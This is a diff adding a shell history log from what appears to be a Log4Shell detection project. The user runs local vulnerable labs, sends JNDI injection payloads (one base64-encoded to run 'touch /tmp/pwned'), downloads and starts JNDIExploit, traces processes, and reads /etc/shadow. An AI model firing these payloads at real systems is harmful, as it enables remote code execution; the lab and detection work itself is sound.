+ 1650  sudo lsof -i :27411
+ 1651  sudo lsof -i :80
+ 1652  sudo kill -9 27411
+ 1653  sudo lsof -i :80
+ 1654  curl 'http://localhost:8000/hallo?name=$\{jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de\}'
+ 1655  cd Code/
+ 1656  cd Git/
+ 1657  cd log4j-log4shell-exploit/
+ 1658  code .
+ 1659  ./mvnw package
+ 1660  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1661  cd ..
+ 1662  rm -rf log4j-log4shell-exploit/
+ 1663  git clone https://github.com/predic8/log4j-log4shell-exploit
+ 1664  cd log4j-log4shell-exploit
+ 1665  ./mvnw package
+ 1666  code .
+ 1667  ./mvnw package
+ 1668  reboot
+ 1669  cd Code/Git/log4j-log4shell-exploit/
+ 1670  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1671  cd ..
+ 1672  cd log4j-log4shell-exploit/
+ 1673  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1674  calc
+ 1675  gnome-calculator
+ 1676  gnome-calculate  
+ 1677  gnome-calculator    
+ 1678  git clone https://github.com/predic8/log4j-log4shell-exploit
+ 1679  cd log4j-log4shell-exploit
+ 1680  code .
+ 1681  ./mvnw package
+ 1682  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1683  cd log4j-log4shell-exploit/
+ 1684  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1685  cd ..
+ 1686  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1687  cd log4j-log4shell-exploit/
+ 1688  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1689  docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
+ 1690  $ docker exec vulnerable-app shell
+ 1691  $ docker exec vulnerable-app /bin/shell
+ 1692  $ docker exec vulnerable-app /bin/bash
+ 1693  $ docker exec vulnerable-app ls
+ 1694  $ docker exec vulnerable-app ls /tmp
+ 1695  $ docker exec -it vulnerable-app ls
+ 1696  wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+ 1697  unzip JNDIExploit.v1.2.zip
+ 1698  java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+ 1699  # will execute 'touch /tmp/pwned'
+ 1700  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+ 1701  docker exec vulnerable-app ls
+ 1702  docker exec vulnerable-app /bin/shell
+ 1703  docker exec vulnerable-app shell
+ 1704  docker exec vulnerable-app bash
+ 1705  docker exec vulnerable-app /bin/bash
+ 1706  docker exec vulnerable-app /bin/shell
+ 1707  docker exec -it vulnerable-app /bin/bash
+ 1708  docker exec -it vulnerable-app /bin/sh
+ 1709  $ git clone https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.git
+ 1710  $ cd Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab/
+ 1711  $ docker build spring-boot-log4j -t spring-boot-log4j-vulnerable
+ 1712  $ docker run -p 8080:8080 --name spring-boot-log4j-vulnerable spring-boot-log4j-vulnerable
+ 1713  git clone https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.git
+ 1714  cd Code/Git/
+ 1715  git clone https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.git
+ 1716  cd Code/Git/
+ 1717  git clone https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.git
+ 1718  cd Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab/
+ 1719  docker build spring-boot-log4j -t spring-boot-log4j-vulnerable
+ 1720  docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
+ 1721  uname
+ 1722  uname -f
+ 1723  man uname
+ 1724  uname -a
+ 1725  cd Desktop/
+ 1726  cat > github-log4j
+ 1727  cd Code/Git/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab/
+ 1728  docker build spring-boot-log4j -t spring-boot-log4j-vulnerable
+ 1729  docker-compose up -d
+ 1730  cd ..
+ 1731  git clone https://github.com/christophetd/log4shell-vulnerable-app
+ 1732  cd log4shell-vulnerable-app/
+ 1733  code .
+ 1734  wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+ 1735  unzip JNDIExploit.v1.2.zip
+ 1736  java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+ 1737  docker exec vulnerable-app ls /tmp
+ 1738  docker exec -it vulnerable-app /bin/bash
+ 1739  docker exec -it vulnerable-app /bin/sh
+ 1740  reboot
+ 1741  sudo mininet
+ 1742  mn
+ 1743  mininet
+ 1744  sudo mn
+ 1745  sudo vitualbox
+ 1746  sudo vm
+ 1747  virtualbox
+ 1748  sudo virtualbox
+ 1749  sudo modprobe vboxdrv
+ 1750  sudo -i
+ 1751  sudo mv ~/Downloads/lab2.py .
+ 1752  code .
+ 1753  sudo modprobe vboxdrv
+ 1754  sudo virtualbox
+ 1755  code Code/Git/Network_Lab/share/lab2.py 
+ 1756  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1757  clear
+ 1758  ps -ef | grep ldap
+ 1759  kill -9  1947
+ 1760  ps -ef | grep ldap
+ 1761  sudo kill -9  1947
+ 1762  ps -ef | grep ldap
+ 1763  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1764  ps 
+ 1765  ps -ef | grep 41450
+ 1766  ps -auxef | grep 41450
+ 1767  ps -et | grep 41450
+ 1768  ps -eT | grep 41450
+ 1769  cd /var/run/nscd/
+ 1770  cd /var/run/
+ 1771  ls
+ 1772  ls -a
+ 1773  ls -l
+ 1774  cd lock
+ 1775  ls
+ 1776  ls -l apache2/
+ 1777  ls -l 
+ 1778  cd ../slapd/
+ 1779  ls
+ 1780  ls -l
+ 1781  cat slapd.pid 
+ 1782  cat slapd.args
+ 1783  vi /etc/ldap/slapd.d/
+ 1784  vi /etc/ldap/slapd.d/cn\=config.ldif 
+ 1785  sudo vi /etc/ldap/slapd.d/cn\=config.ldif 
+ 1786  ss -au
+ 1787  ss -an
+ 1788  ss -ap 
+ 1789  ss -ap | grep ldap
+ 1790  ss -an
+ 1791  ss -an | grep 10389
+ 1792  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1793  strace -f ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1794  clear
+ 1795  strace -f ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1796  systemctl status
+ 1797  systemctl status ldap
+ 1798  ps -ef | grep ldap
+ 1799  ss -an | grep 10389
+ 1800  ps -ef | grep ldap
+ 1801  ss -anp | grep 10389
+ 1802  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1803  cd Code/Git/log4j-log4shell-exploit/
+ 1804  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1805  ./mvnw package
+ 1806  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1807  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1808  ./mvnw ex-X ec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1809  ./mvnw -X exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1810  cd Code/Git/log4j-log4shell-exploit/
+ 1811  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1812  code .
+ 1813  /bin/python /home/asa/ta/Q1.py
+ 1814  /bin/python /home/asa/ta/Q2.py
+ 1815  /bin/python /home/asa/ta/Q3.py
+ 1816  mkdir ta
+ 1817  cd ta
+ 1818  code .
+ 1819  gnome-calculator
+ 1820  git clone https://github.com/predic8/log4j-log4shell-exploit
+ 1821  cd log4j-log4shell-exploit
+ 1822  code .
+ 1823  ./mvnw package 
+ 1824  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1825  cd Code/Git/log4j-log4shell-exploit/
+ 1826  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1827  cd Code/Git/log4j-log4shell-exploit/
+ 1828  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1829  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1830  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1831  sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("Command executed: PID %d, Comm %s, Filename %s\n", pid, comm, str(args->filename)); }'
+ 1832  git add .
+ 1833  git commit -m "log4shell commit"
+ 1834  git push
+ 1835  git pull
+ 1836  git pull
+ 1837  sudo cat /etc/shadow/
+ 1838  sudo cat /etc/shadow
+ 1839  clear
+ 1840  cat /etc/passwd
+ 1841  cat /etc/passwd | cut -d:
+ 1842  cat /etc/passwd | cut -d: -f1
+ 1843  cat /etc/passwd | cut -d: -f2
+ 1844  clear
+ 1845  sudo cut -d: -f1 /etc/shadow
+ 1846  sudo cat /etc/shadow
+ 1847  clear
+ 1848  grep -E '^([^:]+):[*!]' /etc/shadow | cut -d: -f1 | tee /tmp/disabled_users.txt | wc -l
+ 1849  sudo grep -E '^([^:]+):[*!]' /etc/shadow | cut -d: -f1 | tee /tmp/disabled_users.txt | wc -l
+ 1850  more /tmp/disabled_users.txt 
+ 1851  clear
+ 1852  sudo grep -E '^([^:]+):[*!]' /etc/shadow | cut -d: -f1 | tee /tmp/disabled_users.txt
+ 1853  wc -l /tmp/disabled_users.txt 
+ 1854  rm /tmp/disabled_users.txt 
+ 1855  cat /etc/passwd | cut -d: -f1
+ 1856  cat /etc/passwd | cut -d: -f1,7
+ 1857  cat /etc/passwd | grep /sbin/nologin | cut -d: -f1 | wc -l
+ 1858  cat /etc/passwd | grep nologin | cut -d: -f1 | wc -l
+ 1859  cat /etc/passwd | grep /sbin/nologin | cut -d: -f1
+ 1860  cat /etc/passwd | grep /sbin/nologin | cut -d: -f1 | wc -l
+ 1861  clear
+ 1862  cela
+ 1863  rclea
+ 1864  rclear
+ 1865  clear
+ 1866  sudo useradd -m -d /test1/ -p testpass test1
+ 1867  grep '^test1:' /etc/passwd
+ 1868  sudo cat /etc/group
+ 1869  sudo cat /etc/shadow | cut -d: -f1
+ 1870  sudo userdel -r test1
+ 1871  sudo userdel test1
+ 1872  sudo cat /etc/shadow | cut -d: -f1
+ 1873  cd Code/Git/
+ 1874  git clone https://github.com/Ode2theCode/Front-End.git
+ 1875  ls
+ 1876  cd Front-End/
+ 1877  node -v
+ 1878  npm create vit
+ 1879  sudo apt install npm
+ 1880  npm create vite@latest
+ 1881  npm create vite
+ 1882  npm -v
+ 1883  node -v
+ 1884  sudo apt update node
+ 1885  sudo apt install node
+ 1886  node
+ 1887  sudo npm install -g n
+ 1888  sudo n stable
+ 1889  node -v
+ 1890  npm create vite@latest
+ 1891  npm cache clean --force
+ 1892  sudo npm install -g npm
+ 1893  npm cache clean --force
+ 1894  npm create vite@latest
+ 1895  sudo apt-get remove nodejs
+ 1896  sudo apt autoremove
+ 1897  node -v
+ 1898  sudo apt install node
+ 1899  sudo apt install nodejs
+ 1900  npm create vite@latest
+ 1901  npm -v
+ 1902  sudo install npm
+ 1903  sudo apt install npm
+ 1904  npm -v
+ 1905  sudo apt-get purge --auto-remove nodejs npm
+ 1906  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
+ 1907  source ~/.nvm/nvm.sh
+ 1908  nvm install --lts
+ 1909  nvm alias default lts/*
+ 1910  node -v
+ 1911  npm -v
+ 1912  npm create vite@latest
+ 1913  cd ode2dcode/
+ 1914  npm install
+ 1915  npm run dev
+ 1916  git add .
+ 1917  git commit -m "vite setup"
+ 1918  git push
+ 1919  git pull
+ 1920  git status
+ 1921  git add .
+ 1922  git commit -m "final proj doc"
+ 1923  git push
+ 1924  cd ..
+ 1925  rm -rf Operating_systems/
+ 1926  cd xv6-public/
+ 1927  ls
+ 1928  git status
+ 1929  git pull
+ 1930  top
+ 1931  sudo apt install perf
+ 1932  which perf
+ 1933  perf -h
+ 1934  perf -v
+ 1935  sudo apt install strace
+ 1936  strace -v
+ 1937  strace -h
+ 1938  sudo perf stat -ae 'kmem:*'
+ 1939  code .
+ 1940  systemctl status ldap
+ 1941  ps -aux | pgrep ldap
+ 1942  which openldap
+ 1943  ps -aux | grep ldap
+ 1944  ss -na
+ 1945  ss -nap
+ 1946  ss -nap | grep ldap
+ 1947  ss -ap | grep ldap
+ 1948  ss -ap
+ 1949  ss -ap | less
+ 1950  man ldap
+ 1951  ss -ap | less
+ 1952  ss -apn | less
+ 1953  lttng
+ 1954  sudo apt install lttng-tools
+ 1955  tracecompass
+ 1956  ps -ef | grep ldap
+ 1957  ldd /usr/sbin/slapd
+ 1958  nm /lib/x86_64-linux-gnu/libldap-2.5.so.0 | less
+ 1959  nm -D /lib/x86_64-linux-gnu/libldap-2.5.so.0 | less
+ 1960  cd Code/Git/log4j-log4shell-exploit/target/classes/
+ 1961  java -cp Badcode
+ 1962  ls
+ 1963  cd ..
+ 1964  ls
+ 1965  cd ..
+ 1966  ls
+ 1967  cd src/
+ 1968  ls
+ 1969  cd main/
+ 1970  ls
+ 1971  cd java/
+ 1972  ls
+ 1973  vi BadCode.java 
+ 1974  ls
+ 1975  cd ..
+ 1976  ls
+ 1977  cd ..
+ 1978  ls
+ 1979  cd ..
+ 1980  ls
+ 1981  cd target/classes/
+ 1982  ls
+ 1983  java ..BadCode 
+ 1984  java main.BadCode 
+ 1985  java ..BadCode 
+ 1986  cd ..
+ 1987  cd src/main/java/
+ 1988  java BadCode 
+ 1989  strace -f java BadCode 
+ 1990  strace -f java BadCode > filename.txt
+ 1991  ls
+ 1992  more filename.txt 
+ 1993  strace -f java BadCode -o trace.1
+ 1994  ls
+ 1995  strace --help
+ 1996  strace -o trace1 -f java BadCode
+ 1997  vi trace1 
+ 1998  ps -eT | grep 44652
+ 1999  ps -ef | grep 44652
+ 2000  ss -npa | grep 8000
+ 2001  ps -ef | grep 71431
+ 2002  ss -nap | grep 10389
+ 2003  ss -nap | grep 8000
+ 2004  ps -ef | grep 70753
+ 2005  ps -ef | grep 71426
+ 2006  ps -eT | grep 71426
+ 2007  history > ../log4shell_detection/commands_logs/history2
